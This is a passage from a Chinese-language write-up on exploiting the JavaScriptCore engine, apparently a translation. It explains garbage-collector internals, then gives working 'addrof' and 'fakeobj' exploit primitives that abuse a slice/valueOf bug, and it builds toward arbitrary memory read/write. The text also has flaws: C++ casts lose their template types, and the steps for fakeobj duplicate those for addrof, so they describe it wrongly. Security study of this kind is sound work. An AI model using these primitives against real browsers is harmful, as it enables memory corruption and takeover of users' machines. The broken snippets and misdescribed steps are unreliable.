#### 3.1 垃圾收集器的基础
JavaScript是一种具有垃圾回收的语言，这意味着程序员不需要关心内存的管理。相反，垃圾收集器将不时收集不可达的对象。
垃圾收集的其中一种方法是引用计数，其在许多应用中广泛使用。 但是，目前，所有主要的JavaScript引擎都使用标记-扫描算法。
这里，收集器定期扫描所有活动对象，从一组根节点开始，然后释放所有死对象。 根节点通常是位于栈上的指针，或者位于web浏览器上下文中的全局对象。
垃圾收集系统之间有各种区别。我们现在将讨论垃圾收集系统的一些关键特性，这应该有助于读者理解一些相关的代码。 熟悉本主题的读者可以自由地跳过本章节。
首先第一个特性，JSC使用保守的垃圾收集器[](https://www.gnu.org/software/guile/manual/html_node/Conservative-GC.html)。实质上，这意味着GC不跟踪根节点本身。但在GC期间，它将扫描堆栈中任何可能是指向堆的指针的值，并将它们视为根节点。而Spidermonkey使用精确的垃圾收集器，因此需要将所有对堆对象的引用包装在堆栈中的指针类（Rooted
<>）中，该指针类负责将对象注册到垃圾收集器。
第二个特性，JSC使用增量垃圾回收器。这种垃圾收集器在几个步骤中执行标记，并允许应用程序在其间运行，从而降低GC延迟。但是，这需要一些额外的努力才能正常工作。
考虑以下情况：
  * GC运行并访问O对象及其所有引用的对象,它将O标记为已访问和稍后暂停，以便应用程序可以再次运行。
  * 修改O对象，并且向其中添加对另一对象P的新引用。
  * 然后GC再次运行，但它不知道P对象.它已经完成标记阶段，就直接释放P的内存。
> O对象和P对象是笔者所举例子
为了避免这种情况，就要写屏障并插入到引擎中，这种情况下会给垃圾收集器一个写屏障的的信号。在JSC中，这些障碍使用WriteBarrier
<>和CopyBarrier <>类实现。
>
> 写屏障：当有老生代中的对象出现指向新生代对象的指针时，便记录下来这样的跨区指向。由于这种记录行为总是发生在写操作时，因此被称为写屏障。这样可以建立老生代对象指向新生代对象的列表，判断新生代指针是否存活。
最后一个特性，JSC使用移动和非移动垃圾收集器。
移动垃圾收集器将活对象移动到不同位置，并更新所有指向这些对象的指针。这对于在许多死对象的情况可以达到优化的效果，因为没有用于这些死对象运行时的开销(而不是将它们添加到空闲列表，整个存储器区域被简单地声明为空)
。JSC将JavaScript的自身对象以及一些其他对象存储在不移动的堆和标记的空间中，同时将"butterflies"和其他数组存储在移动的堆和复制的空间内。
#### 3.2 标记空间
标记空间是跟踪所分配的单元的存储器块的集合。
在JSC中，在标记空间中分配的每个对象必须从JSCell类继承，因此这些对象以8字节作为头开始，除了其他字段之外，这个字段都包含GC使用的当前单元状态，由收集器用于跟踪其已访问的单元。
还有一个值得提及的标记空间，JSC在每个标记块的开头存储一个MarkedBlock实例：
    inline MarkedBlock* MarkedBlock::blockFor(const void* p)
    {
        return reinterpret_cast(
                    reinterpret_cast(p) & blockMask);
    }
该实例具有指向拥有堆和VM实例的指针，如果它们在整个程序中不能使用，VM实例则允许引擎获得这些指针。在执行某些操作时可能需要有效的MarkedBlock实例，这使得伪造对象更加困难。
因此，如果可能，有必要在有效标记块内创建伪对象。
#### 3.3-复制空间
复制空间存储的缓冲区与标记空间内的某个对象是有相关联的。这些大多是“Butterflies”，但类型数组的内容也可能位于这里。这就造成我们的内存泄露发生在这个内存区域。
复制的空间分配器非常简单：
    CheckedBoolean CopiedAllocator::tryAllocate(size_t bytes, void** out)
    {
        ASSERT(is8ByteAligned(reinterpret_cast(bytes)));
        size_t currentRemaining = m_currentRemaining;
        if (bytes > currentRemaining)
            return false;
        currentRemaining -= bytes;
        m_currentRemaining = currentRemaining;
        *out = m_currentPayloadEnd - currentRemaining - bytes;
        ASSERT(is8ByteAligned(*out));
        return true;
    }
它的本质上是一个bump分配器：在标记块被完全使用之前，它将简单地返回当前标记块中的下一个N字节的存储器。因此，它几乎可以保证两个后续的分配被放置在存储器的相邻位置（边缘区域将是第一个被当前块填充的地方）。
这对我们来说是个比较有利的。如果我们分配两个数组，每个数组都有一个元素，那么两个“Butterfly”将在每种情况下彼此相邻。
### 4 打造exploit原语
虽然有问题的bug首先看起来像是越权访问的错误，但它实际上可以成为更强大的漏洞利用，通过它我们可以新建一个Javascript数组，使用我们自定义的JSValues注入到其中，从而提升权限，进入引擎。
我们现在将利用给定的bug构造两个exploit原语，允许我们
  1. 暴露任意JavaScript对象的地址
  2. 将伪造的JavaScript对象注入引擎。
我们将这两个原语称为“addrof”和“fakeobj”。
#### 4.1 环境：Int64
正如我们之前所见，我们的exploit原语在当前返回的是浮点值而不是整数。至少在理论上，JavaScript中的所有数字都是64位浮点数[[17]](http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-language-types-number-type)。
实际上，如已经提到的，出于性能原因，大多数引擎具有专用的32位整数类型，在必要时（在溢出时）会转换为浮点值，所以不可能用JavaScript中的原语数来表示任意64位整数（特别是地址）。
因此，必须构建允许存储64位整数实例的帮助模块。它的满足以下条件：
  * 从不同的参数类型初始化Int64的实例，参数类型可以是字符串、数字和字节数组。
  * 通过assignXXX方法将加法和减法的结果分配给现有实例。有时候，使用这些方法减少了更多的堆分配
  * 创建新实例，通过Add和Sub函数存储加法或减法的结果。
  * 在双精度，JSValues和Int64实例之间进行转换，使底层的位模式保持不变。
最后值得进一步讨论的是，正如我们上面已经看到的，我们获得了一个double类型的数，其在底层内存中被转换成我们想要的地址，我们需要在原生双精度和我们的整数之间进行转换，使得底层的位保持不变。可以考虑在下面c语言代码中使用asDouble（）：
    double asDouble(uint64_t num)
    {
        return *(double*)&num;
    }
asJSValue方法进一步遵守NaN-boxing程序流程，并产生具有给定位模式的JSValue。感兴趣的读者可参考所附源代码归档文件中的int64.js文件，了解更多详细信息。
有了这个方法，让我们回到构建我们的两个exploit原语。
#### 4.2 addrof和fakeobj
这两种原语都依赖于JSC在原生表示中存储双精度数组的事实，而不是NaN-boxing的表示。
这本质上允许我们写入本地双精度（索引类型是ArrayWithDoubles），但是引擎将它们视为JSValues（索引类型是ArrayWithContiguous），反之亦然。
这里是利用地址泄漏所需的步骤：
  1. 创建一个双精度数组。这将在内部存储为IndexingType ArrayWithDouble
  2. 使用自定义的valueOf函数设置对象
2.1 收缩先前创建的数组
2.2 分配一个新数组，其中只包含我们需要的对象，该对象是我们所想知道地址的对象。 这个数组位于复制空间，（很可能）被放置在新的“Butterfly”后面。
2.3 返回一个大于数组大小的值来触发bug
  1. 调用目标数组上的slice（），将来自步骤2的对象作为参数之一
slice()保留了索引类型，我们可以在数组中找到所需要的具有64位浮点指针值的地址。因此，我们的新数组将被看做是原生的双精度数据，允许我们泄露出任意的JSValue实例，从而泄露指针。
fakeobj原语基本上以另一种方式工作。 这里我们将本地双精度注入到JSValues数组中，这允许我们创建JSObject指针：
  1. 创建一个双精度数组。这将在内部存储为IndexingType ArrayWithDouble
  2. 使用自定义的valueOf函数设置对象
2.1 收缩先前创建的数组
2.2 分配一个新数组，其中只包含我们需要的对象，该对象是我们所想知道地址的对象。 这个数组位于复制空间，（很可能）被放置在新的“Butterfly”后面。
2.3 返回一个大于数组大小的值来触发bug
  1. 调用目标数组上的slice（），将来自步骤2的对象作为参数之一。
这两个原语的实现如下：
    function addrof(object) {
        var a = [];
        for (var i = 0; i < 100; i++)
            a.push(i + 0.1337);   // Array must be of type ArrayWithDoubles
        var hax = {valueOf: function() {
            a.length = 0;
            a = [object];
            return 4;
        }};
        var b = a.slice(0, hax);
        return Int64.fromDouble(b[3]);
    }
    function fakeobj(addr) {
        var a = [];
        for (var i = 0; i < 100; i++)
            a.push({});     // Array must be of type ArrayWithContiguous
        addr = addr.asDouble();
        var hax = {valueOf: function() {
            a.length = 0;
            a = [addr];
            return 4;
        }};
        return a.slice(0, hax)[3];
    }
#### 4.3 利用准备
从这里我们的目标将变成，通过伪造一个JavaScript对象获得一个任意的内存读/写原语。 我们面临以下问题：
  * Q1. 我们想伪造什么样的对象？
  * Q2. 我们如何伪造这样的对象？
  * Q3. 我们在哪里放置伪对象以便我们知道它的地址？
一段时间以来，JavaScript引擎已经支持类型数组[[18]](http://www.ecma-international.org/ecma-262/6.0/#sec-typedarray-objects)，类型数组是一种高效和高度优化的原始二进制数据存储。它具有可变性(与Javascript字符串相反)，这对于我们的伪对象来说是很好的候选对象，我们就可以从脚本控制它的数据指针来产生任意读/写的可用原语，最后达到我们的目的——伪造一个Float64Array实例。
我们接下来将讨论第二个问题和第三个问题的时候，需要对JSC内部（即JSObject系统）进行另一番讨论。